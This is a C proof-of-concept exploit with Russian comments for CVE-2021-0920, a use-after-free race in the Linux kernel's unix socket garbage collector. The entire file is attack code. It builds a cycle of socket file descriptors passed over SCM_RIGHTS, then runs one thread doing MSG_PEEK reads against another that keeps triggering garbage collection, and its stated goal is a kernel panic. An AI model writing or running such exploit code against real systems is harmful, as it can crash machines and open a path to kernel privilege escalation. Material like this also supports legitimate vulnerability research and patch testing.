#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/resource.h>
#include <sys/syscall.h>
#include <errno.h>
#include <pthread.h>
#include <sched.h>
#include <stdbool.h>
#include <time.h>

// Глобальные сокеты для графа
int R[2], B[2], C[2], D[2];

// Флаги для синхронизации потоков
volatile int stop_race = 0;
volatile int gc_ready = 0;

// Функция для привязки к ядру (для стабильности)
void pin_cpu(int cpu) {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    sched_setaffinity(0, sizeof(set), &set);
}

void send_fd(int socket, int fd) {
    struct msghdr msg = {0};
    char buf[CMSG_SPACE(sizeof(int))];
    memset(buf, 0, sizeof(buf));
    struct iovec io = { .iov_base = (void*)"", .iov_len = 1 };
    msg.msg_iov = &io;
    msg.msg_iovlen = 1;
    msg.msg_control = buf;
    msg.msg_controllen = sizeof(buf);
    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_level = SOL_SOCKET;
    cmsg->cmsg_type = SCM_RIGHTS;
    cmsg->cmsg_len = CMSG_LEN(sizeof(int));
    memcpy(CMSG_DATA(cmsg), &fd, sizeof(int));
    if (sendmsg(socket, &msg, 0) < 0) {
        perror("sendmsg");
    }
}

int recv_fd(int socket, int flags) {
    struct msghdr msg = {0};
    char buf[1];
    struct iovec io = { .iov_base = buf, .iov_len = sizeof(buf) };
    msg.msg_iov = &io;
    msg.msg_iovlen = 1;
    char cmsg_buf[CMSG_SPACE(sizeof(int))];
    msg.msg_control = cmsg_buf;
    msg.msg_controllen = sizeof(cmsg_buf);
    
    if (recvmsg(socket, &msg, flags) < 0) {
        return -1;
    }
    
    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    if (cmsg && cmsg->cmsg_type == SCM_RIGHTS) {
        int fd;
        memcpy(&fd, CMSG_DATA(cmsg), sizeof(int));
        return fd;
    }
    return -1;
}

// Поток 1: Атакующий (выполняет MSG_PEEK и обычное чтение)
void* attacker_thread(void* arg) {
    pin_cpu(0); // Привязываем к CPU 0
    // Пытаемся повысить приоритет (если разрешено SELinux)
    setpriority(PRIO_PROCESS, 0, -19);

    while (!stop_race) {
        // 1. Получаем B через MSG_PEEK (не забирая сообщение из очереди R)
        int b_fd = recv_fd(R[1], MSG_PEEK);
        if (b_fd >= 0) {
            // 2. Получаем C через MSG_PEEK (не забирая сообщение из очереди B)
            int c_fd = recv_fd(b_fd, MSG_PEEK);
            if (c_fd >= 0) {
                // 3. Обычное чтение B. Это очистит M.fp и заблокируется на unix_gc_lock
                recv_fd(b_fd, 0); 
                
                // 4. Читаем C (пытаемся получить указатель на N)
                // Если GC уже освободил N, это вызовет UAF
                recv_fd(c_fd, 0); 
                
                close(c_fd);
            }
            close(b_fd);
        }
        // Небольшая пауза, чтобы не задушить систему
        usleep(100); 
    }
    return NULL;
}

// Поток 2: Триггер GC (создает временные циклы, чтобы запустить unix_gc)
void* gc_trigger_thread(void* arg) {
    pin_cpu(1); // Привязываем к CPU 1
    // Понижаем приоритет, чтобы он не мешал атакующему потоку
    setpriority(PRIO_PROCESS, 0, 19);

    while (!stop_race) {
        // Создаем пару сокетов и зацикливаем их, чтобы запустить GC
        int t1[2], t2[2];
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, t1) == 0 && 
            socketpair(AF_UNIX, SOCK_STREAM, 0, t2) == 0) {
            
            send_fd(t1[0], t2[0]);
            send_fd(t2[0], t1[0]);
            
            // Закрываем, чтобы спровоцировать сборку мусора
            close(t1[0]);
            close(t2[0]);
            close(t1[1]);
            close(t2[1]);
        }
        // Ждем, чтобы GC успел отработать и не перегрузить систему
        usleep(5000); 
    }
    return NULL;
}

int main() {
    printf("[*] CVE-2021-0920 Race PoC v5 (Based on Project Zero logic)\n");

    // 1. Создаем граф ссылок
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, R) < 0 ||
        socketpair(AF_UNIX, SOCK_STREAM, 0, B) < 0 ||
        socketpair(AF_UNIX, SOCK_STREAM, 0, C) < 0 ||
        socketpair(AF_UNIX, SOCK_STREAM, 0, D) < 0) {
        perror("socketpair");
        return 1;
    }

    // R -> B, B -> C, C -> D, D -> C
    send_fd(R[0], B[0]);
    send_fd(B[0], C[0]);
    send_fd(C[0], D[0]);
    send_fd(D[0], C[0]); // Цикл

    // Закрываем исходные дескрипторы (кроме R[1], который будем читать)
    close(R[0]); 
    close(B[0]); 
    close(C[0]); 
    close(D[0]);

    printf("[+] Graph created. Starting threads...\n");

    // 2. Запускаем потоки
    pthread_t t_attacker, t_gc;
    pthread_create(&t_attacker, NULL, attacker_thread, NULL);
    pthread_create(&t_gc, NULL, gc_trigger_thread, NULL);

    // 3. Даем время на гонку
    printf("[*] Racing for 60 seconds. If the kernel panics, we win.\n");
    sleep(60);

    stop_race = 1;
    pthread_join(t_attacker, NULL);
    pthread_join(t_gc, NULL);

    printf("[-] PoC finished without panic.\n");
    return 0;
}